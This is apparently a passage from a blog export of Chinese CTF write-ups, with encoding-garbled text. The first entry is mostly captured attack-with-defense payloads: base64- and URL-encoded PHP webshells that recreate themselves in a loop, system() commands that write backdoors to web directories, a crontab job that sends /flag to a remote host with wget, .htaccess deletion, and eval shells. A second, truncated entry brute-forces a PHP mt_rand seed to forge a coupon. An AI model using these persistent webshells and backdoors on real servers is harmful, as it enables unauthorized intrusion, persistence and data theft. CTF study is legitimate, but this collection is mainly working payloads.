&quot;PD9waHAKICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgICAgICAgICAkZmlsZSA9ICIuNGIyMjMzMWNlODZjOGNhYTBhZGMzNzAzOTMyNmQ1ZmMucGhwIjsKICAgICAgICAgICAgJHNoZWxsID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUthV1lvUUNSZlVrVlJWVVZUVkZzaWFHRnphQ0pkUFQwOUltWmxZV1F3Wm1aaE1EQmpNVGxpTm1JMlpUSTFaVFl3Wm1JelltTmxZalJpSWlrS2V3b2dJQ0FnUUhONWMzUmxiU2drWDFKRlVWVkZVMVJiSW0xdmVHbGhiM2hwTmpZMklsMHBPd3A5Q2o4KycpOwogICAgICAgICAgICB1bmxpbmsoX19GSUxFX18pOwogICAgICAgICAgICB3aGlsZSAoVFJVRSkge3sKICAgICAgICAgICAgaWYgKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSE9PSRzaGVsbCkge3sgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRzaGVsbCk7IH19CiAgICAgICAgICAgIHVzbGVlcCg1KTsKICAgICAgICAgICAgfX0KICAgICAgICAgICAgPz4=&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX);$code_templateÁöÑbase64Ëß£Á†Å&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;PD9waHAKaWYoQCRfUkVRVUVTVFsiaGFzaCJdPT09ImZlYWQwZmZhMDBjMTliNmI2ZTI1ZTYwZmIzYmNlYjRiIikKewogICAgQHN5c3RlbSgkX1JFUVVFU1RbIm1veGlhb3hpNjY2Il0pOwp9Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt; $shell Ëß£base64Ôºö&lt;?phpif(@$_REQUEST[&quot;hash&quot;]===&quot;fead0ffa00c19b6b6e25e60fb3bceb4b&quot;)&#123; @system($_REQUEST[&quot;moxiaoxi666&quot;]);&#125;?&gt; 2Ôºö 1234567891011121314151617181920212223242526272829303132333435363738394041424344system%28%27%2Fbin%2Fecho+mo123%3B%2Fbin%2Fecho+JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw%3D%3D+%7C+%2Fusr%2Fbin%2Fbase64+-d+%7C+%2Fbin%2Fcat+%3E+%2Fhome%2Fteam%2Fworkdir%2F%2F.4b22331ce86c8caa0adc37039326d5fc.php%3B%2Fbin%2Fecho+xiaoxi456890%27%29%3B// url decodesystem(&apos;/bin/echo mo123;/bin/echo JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// base64 decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;PD9waHAKICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgICAgICAgICAkZmlsZSA9ICIuNGIyMjMzMWNlODZjOGNhYTBhZGMzNzAzOTMyNmQ1ZmMucGhwIjsKICAgICAgICAgICAgJHNoZWxsID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUthV1lvUUNSZlVrVlJWVVZUVkZzaWFHRnphQ0pkUFQwOUltWmxZV1F3Wm1aaE1EQmpNVGxpTm1JMlpUSTFaVFl3Wm1JelltTmxZalJpSWlrS2V3b2dJQ0FnUUhONWMzUmxiU2drWDFKRlVWVkZVMVJiSW0xdmVHbGhiM2hwTmpZMklsMHBPd3A5Q2o4KycpOwogICAgICAgICAgICB1bmxpbmsoX19GSUxFX18pOwogICAgICAgICAgICB3aGlsZSAoVFJVRSkge3sKICAgICAgICAgICAgaWYgKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSE9PSRzaGVsbCkge3sgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRzaGVsbCk7IH19CiAgICAgICAgICAgIHVzbGVlcCg1KTsKICAgICAgICAgICAgfX0KICAgICAgICAgICAgPz4=&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// base64 decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;PD9waHAKaWYoQCRfUkVRVUVTVFsiaGFzaCJdPT09ImZlYWQwZmZhMDBjMTliNmI2ZTI1ZTYwZmIzYmNlYjRiIikKewogICAgQHN5c3RlbSgkX1JFUVVFU1RbIm1veGlhb3hpNjY2Il0pOwp9Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt;&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;&lt;?phpif(@$_REQUEST[&quot;hash&quot;]===&quot;fead0ffa00c19b6b6e25e60fb3bceb4b&quot;)&#123; @system($_REQUEST[&quot;moxiaoxi666&quot;]);&#125;Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt;&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;); 3: ÁßçcrontabÂêéÈó®ÂÆöÊó∂‰∫§flag 12345system(&apos;/bin/echo mo123;/bin/echo KiAqICogKiAqIC91c3IvYmluL3dnZXQgImh0dHA6Ly8xOTIuMTY4LjIwMC4xNTA6ODAwNS9hcGkvdGVhbS9zdWJtaXQvL2MxMzYyODI2MjI5M2M1ODVlYmZhZDM3Y2ExYzVlNzdkNDI4ZjVkY2QiIC1kICImZmxhZz0kKC9iaW4vY2F0IC9mbGFnKSIgLUggIkNvb2tpZTpkZGFhcyIK | /usr/bin/base64 -d | /bin/cat &gt;&gt; /tmp//tmp.conf ; /usr/bin/crontab /tmp//tmp.conf;/bin/echo xiaoxi456890&apos;);decode base64* * * * * /usr/bin/wget &quot;https://192.168.200.150:8005/api/team/submit//c13628262293c585ebfad37ca1c5e77d428f5dcd&quot; -d &quot;&amp;flag=$(/bin/cat /flag)&quot; -H &quot;Cookie:ddaas&quot; 4 1234567891011121314151617system%28%27%2Fbin%2Fecho+HENCE666%3B%2Fbin%2Fecho+PD9waHAKCQlpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkZmlsZSA9ICItLThmMDI5MzhlOWQyMWU2N2JmYzg3MjQwZjU4NGQ2NDQzLnBocCI7CgkJJHNoZWxsID0gJzw%2FcGhwIGlmKCRfUkVRVUVTVFtoYXNoXT09ImY5YjY5YTA5NjUxNGYyODIxMjg5MzVmZDA3N2YyZWJiIil7JGNfMSA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFthXSkpOyRjXzIgPSBiYXNlNjRfZGVjb2RlKHN0cl9yb3QxMygkX1JFUVVFU1RbYl0pKTskY18xKCRjXzIpO30%2FPic7CgkJdW5saW5rKF9fRklMRV9fKTsKCQl3aGlsZSAoVFJVRSkge3sKCQlpZiAoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIT09JHNoZWxsKSB7eyBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHNoZWxsKTsgfX0KCQl1c2xlZXAoNSk7CgkJfX0KCQk%2FPg%3D%3D+%7C+%2Fusr%2Fbin%2Fbase64+-d+%7C+%2Fbin%2Fcat+%3E+%2Fvar%2Fwww%2Fhtml%2F%2F--8f02938e9d21e67bfc87240f584d6443.php%3B%2Fbin%2Fecho+ZHANG777%27%29%3B// decodesystem(&apos;/bin/echo HENCE666;/bin/echo PD9waHAKCQlpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkZmlsZSA9ICItLThmMDI5MzhlOWQyMWU2N2JmYzg3MjQwZjU4NGQ2NDQzLnBocCI7CgkJJHNoZWxsID0gJzw/cGhwIGlmKCRfUkVRVUVTVFtoYXNoXT09ImY5YjY5YTA5NjUxNGYyODIxMjg5MzVmZDA3N2YyZWJiIil7JGNfMSA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFthXSkpOyRjXzIgPSBiYXNlNjRfZGVjb2RlKHN0cl9yb3QxMygkX1JFUVVFU1RbYl0pKTskY18xKCRjXzIpO30/Pic7CgkJdW5saW5rKF9fRklMRV9fKTsKCQl3aGlsZSAoVFJVRSkge3sKCQlpZiAoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIT09JHNoZWxsKSB7eyBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHNoZWxsKTsgfX0KCQl1c2xlZXAoNSk7CgkJfX0KCQk/Pg== | /usr/bin/base64 -d | /bin/cat &gt; /var/www/html//--8f02938e9d21e67bfc87240f584d6443.php;/bin/echo ZHANG777&apos;);// decode base64system(&apos;/bin/echo HENCE666;/bin/echo &lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;--8f02938e9d21e67bfc87240f584d6443.php&quot;; $shell = &apos;&lt;?php if($_REQUEST[hash]==&quot;f9b69a096514f282128935fd077f2ebb&quot;)&#123;$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);&#125;?&gt;&apos;; unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?Pg== | /usr/bin/base64 -d | /bin/cat &gt; /var/www/html//--8f02938e9d21e67bfc87240f584d6443.php;/bin/echo ZHANG777&apos;); 5 1234567891011121314151617%24path+%3D+%27%2Fhome%2Fteam%2Fworkdir%2Fskin%2F--ssssss.php%27%3B%24data+%3D+%27PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgJHBhdGggPSAiL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLnNzc3Nzcy5waHAiOwogICAgICAgICRkYXRhID0gIjw%2FcGhwIGlmKG1kNShcJF9QT1NUWydwYXNzJ10pPT0nYzI3MjFkODM2ZGRiNjg2YjBiMDFjYjAwNjYwODk5NTAnKUBldmFsKFwkX1BPU1RbJ2NtZCddKTs%2FPiI7CiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkZGF0YSk7CiAgICAgICAgc3lzdGVtKCdjaG1vZCA1MDAgJy4kcGF0aCk7CiAgICAgICAgdXNsZWVwKDEwMCk7CiAgICB9CiAgICA%2FPg%3D%3D%27%3B%24data%3D+base64_decode%28%24data%29%3B%40file_put_contents%28%24path%2C%24data%29%3Bsystem%28%27chmod+500+%27.%24path%29%3Bsystem%28%27%27rm+%29// deocde$path = &apos;/home/team/workdir/skin/--ssssss.php&apos;;$data = &apos;PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgJHBhdGggPSAiL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLnNzc3Nzcy5waHAiOwogICAgICAgICRkYXRhID0gIjw/cGhwIGlmKG1kNShcJF9QT1NUWydwYXNzJ10pPT0nYzI3MjFkODM2ZGRiNjg2YjBiMDFjYjAwNjYwODk5NTAnKUBldmFsKFwkX1BPU1RbJ2NtZCddKTs/PiI7CiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkZGF0YSk7CiAgICAgICAgc3lzdGVtKCdjaG1vZCA1MDAgJy4kcGF0aCk7CiAgICAgICAgdXNsZWVwKDEwMCk7CiAgICB9CiAgICA/Pg==&apos;;$data= base64_decode($data);@file_put_contents($path,$data);system(&apos;chmod 500 &apos;.$path);system(&apos;&apos;rm )// base64 decode$path = &apos;/home/team/workdir/skin/--ssssss.php&apos;;$data = &apos;&lt;?php ignore_user_abort(true); set_time_limit(0); while (1)&#123; $path = &quot;/home/team/workdir/skin/.ssssss.php&quot;; $data = &quot;&lt;?php if(md5(\$_POST[&apos;pass&apos;])==&apos;c2721d836ddb686b0b01cb0066089950&apos;)@eval(\$_POST[&apos;cmd&apos;]);?&gt;&quot;; @file_put_contents($path, $data); system(&apos;chmod 500 &apos;.$path); usleep(100); &#125; ?&gt;&apos;;$data= base64_decode($data);@file_put_contents($path,$data);system(&apos;chmod 500 &apos;.$path);system(&apos;&apos;rm ) Âà†„ÄÅË¶ÜÁõñ‰∏ä‰º†ÁõÆÂΩïÁöÑ.htaccess 1GET //libraries/lithium/template/view/Compiler.php?along=system(&apos;/bin/echo mo123;rm /home/team/workdir/app/webroot/uploads/.htaccess;/bin/echo xiaoxi456890&apos;); ËøòÊúâ‰∏™Ê≤°ÁúãÊáÇÁöÑipÔºö192.168.17.11 123456789101112131415%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Becho%20%22d32d8%22%3B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3Becho%20%221d77b%22%3Bdie()%3B//decode@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);echo &quot;d32d8&quot;;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125; &quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123; foreach(range(&quot;C&quot;,&quot;Z&quot;)as$L) if(is_dir(&quot;&#123;$L&#125;:&quot;) )$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot; &quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot; &#123;$s&#125;&quot;;echo $R;;echo &quot;1d77b&quot;;die(); Nu1lÁöÑshell1Ôºö192.168.21.x 123456789101112131415file_put_contents(&apos;Nu1ls.php&apos;,base64_decode(&quot;PD9waHAKCXNldF90aW1lX2xpbWl0KDApOwoJaWdub3JlX3VzZXJfYWJvcnQoMSk7Cgl1bmxpbmsoX19GSUxFX18pOwoJd2hpbGUoMSl7CgkJZmlsZV9wdXRfY29udGVudHMoJy4vLm51MWxjdGZzLnBocCcsICc8P3BocCBAZXZhbCgkX0dFVFsnbnVsbCddKTsnKTsKCQlzeXN0ZW0oJ2NobW9kIDc3NyAuY29uZmlnLnBocCcpOwkJCQkJCgkJLy/mjIHnu63lnKhjb25maWcucGhw5Lit5YaZ5YWlCgkJdG91Y2goIi4vLm51MWxjdGZzLnBocCIsIG1rdGltZSgyMCwxNSwxLDExLDE3LDIwMTcpKTsJCgkJdXNsZWVwKDEwMCk7Cgl9Cj8+Cg==&quot;))base64Ëß£Á†ÅÔºö&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1)&#123; file_put_contents(&apos;./.nu1lctfs.php&apos;, &apos;&lt;?php @eval($_GET[&apos;null&apos;]);&apos;); system(&apos;chmod 777 .config.php&apos;); touch(&quot;./.nu1lctfs.php&quot;, mktime(20,15,1,11,17,2017)); usleep(100); &#125;?&gt; Nu1lÁöÑshell2Ôºö123456file_put_contents%28%22Nu1ls.php%22%2Cbase64_decode%28%22PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs%2FPg%3D%3D%22%29%29%3B&amp;zzz=aaa//decodefile_put_contents(&quot;Nu1ls.php&quot;,base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs/Pg==&quot;));&amp;zzz=aaa//file_put_contents(&quot;Nu1ls.php&quot;,base64_decode(&quot;&lt;?php @eval($_POST[&apos;homaebic&apos;]);?&gt;&quot;));&amp;zzz=aaa finalÊúÄÂêéËøòÊúâ‰∏Ä‰∫õÈ™öÂ•óË∑ØÔºåÁ≠âËÄÉÂÆåËØïÂÜôÂ•ΩawdÊ°ÜÊû∂‰∫Ü‰∏ÄËµ∑ÂàÜ‰∫´Âá∫Êù•~]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SWPUCTF WEB Writeup]]></title>
    <url>%2F2018%2F12%2F20%2FSwpu%20CTF%202018%20Writeup%2F</url>
    <content type="text"><![CDATA[WEb 1:Áî®‰ºòÊÉ†Á†Å ‰π∞‰∏™ X ?www.zipÊ∫êÁ†ÅÊ≥ÑÈú≤Ôºö123456789101112131415161718192021222324252627&lt;?php//ÁîüÊàê‰ºòÊÉ†Á†Å$_SESSION[&apos;seed&apos;]=rand(0,999999999);function youhuima()&#123; mt_srand($_SESSION[&apos;seed&apos;]); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; setcookie(&apos;Auth&apos;, $auth);&#125;//support if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123; if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123; //ÊâßË°åÂëΩ‰ª§ &#125;else &#123; //flagÂ≠óÊÆµÂíåÊüê‰∫õÂ≠óÁ¨¶Ë¢´ËøáÊª§! &#125; &#125;else&#123; // ‰Ω†ÁöÑËæìÂÖ•‰∏çÊ≠£Á°Æ! &#125;?&gt; ÁôªÂΩïÂêéÔºåÈ¢òÁõÆÁªô‰∫ÜÊàë‰ª¨15‰ΩçÁöÑ‰ºòÊÉ†Á†ÅÔºåËÄåË¥≠‰π∞XÁöÑ‰ºòÊÉ†Á†ÅÊòØ24‰ΩçÁöÑÔºåÂÜçÂõûËøáÊù•ÁúãÁúã‰ª£Á†ÅÔºåÂæàÊòéÊòæËÄÉÂØüphpÈöèÊú∫Êï∞ÂÆâÂÖ®ÈóÆÈ¢ò„ÄÇ ËøôÁØáÊñáÁ´†ÂàÜÊûêÁöÑ‰∏çÈîôÔºöhttps://wonderkun.cc/index.html/?p=585 ÁÆÄÂçïËÄåË®ÄÔºåÁîüÊàê‰ºòÊÉ†Á†ÅÁöÑÊØè‰∏Ä‰ΩçÂ≠óÊØç(Êï∞)‰ΩøÁî®ÁöÑÈöèÊú∫Êï∞ÁßçÂ≠êÁõ∏ÂêåÔºåÂç≥phpÂú®‰∫ßÁîü‰∏ÄÁ≥ªÂàóÈöèÊú∫Êï∞ÁöÑÊó∂ÂÄôÂè™ËøõË°å‰∫Ü‰∏ÄÊ¨°Êí≠Áßç„ÄÇËÄåÂú®linux64‰ΩçÁöÑÁ≥ªÁªü‰∏≠rand()Âíåmt_rand()ÂáΩÊï∞‰∫ßÁîüÁöÑÊúÄÂ§ßÈöèÊú∫Êï∞ÈÉΩÊòØ2^31-1ÔºåÊâÄ‰ª•Âú®Ëøô‰∏™ËåÉÂõ¥ÂÜÖÂèØ‰ª•ÁàÜÁ†¥„ÄÇ ÊúÄÂàùÊÉ≥ÁùÄÁõ¥Êé•Áî®phpÁàÜÁ†¥Ôºö1234567891011121314151617181920212223242526&lt;?phperror_reporting(E_ALL);//ÁîüÊàê‰ºòÊÉ†Á†Åfunction youhuima($seed)&#123; mt_srand($seed); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; if($auth === &quot;9vmnye6GT7TpzH3&quot;)&#123; echo $seed; exit(); &#125;&#125;for($i=1; $i&lt;999999999; $i++)&#123; youhuima($i);&#125; ÁªìÊûúÂç°‰∫ÜÂæà‰πÖÂæà‰πÖ cpuÁàÜÁÇ∏.. ÂêéÊù•ÂèëÁé∞Â∑≤ÁªèÊúâÂ§ßÁâõÂÜô‰∫Ü‰∏Ä‰∏™cËØ≠Ë®ÄÁàÜÁ†¥ÁßçÂ≠êÁöÑÁ®ãÂ∫èÔºöhttps://www.openwall.com/php_mt_seed/ ËøôÈáåË∏©‰∫ÜÂæàÂ§öÂùë‚Ä¶ 4.0ÁâàÊú¨makeÁºñËØëÊä•ÈîôÔºå3.4ÁöÑÁâàÊú¨Ë∑ëÂá∫Êù•ÁöÑÁßçÂ≠êÊ≠ªÊ¥ªÈÉΩ‰∏çÂØπ.. ÂêéÊù•‰ªîÁªÜÂàÜÊûêÔºåËøô‰∏™ÂíåphpÁâàÊú¨Áõ∏ÂÖ≥Ôºö3.4ÁöÑÁàÜÁ†¥ËÑöÊú¨‰∏≠ÊèèËø∞Ôºö ÁÑ∂ÈπÖÊàë‰ª¨È¢òÁõÆÊòØphp7.2ÁöÑÁâàÊú¨ ÊâÄ‰ª•ËøôÈáåÂè™ËÉΩÁî®4.0ÁöÑÁàÜÁ†¥Á®ãÂ∫è„ÄÇ ÂÖàÂ∞ÜÂ≠óÊØçËΩ¨Êç¢ÊàêÂØπÂ∫îÁöÑÊï∞Â≠óÔºö123456789101112function getseed()&#123; $str = &quot;8zJag6b&quot;; $randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; for($i=0;$i&lt;strlen($str);$i++)&#123; $pos = strpos($randStr,$str[$i]); echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;; //Êï¥ÁêÜÊàêÊñπ‰æø php_mt_seed ÊµãËØïÁöÑÊ†ºÂºè //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]] &#125; echo &quot;\n&quot;;&#125; ÁÑ∂ÂêéÁàÜÁ†¥Ôºö ÊãøÂà∞ÁßçÂ≠êÂêéÔºåËÆ∞ÂæóÂú®Êú¨Âú∞Â∞ÜphpÁâàÊú¨Ë∞ÉÂà∞7.1+ÔºåÁîüÊàê24‰ΩçÁöÑ‰ºòÊÉ†Á†Å123456789101112131415function youhuima()&#123; mt_srand(&apos;727588335&apos;); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=24; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; echo $auth; echo 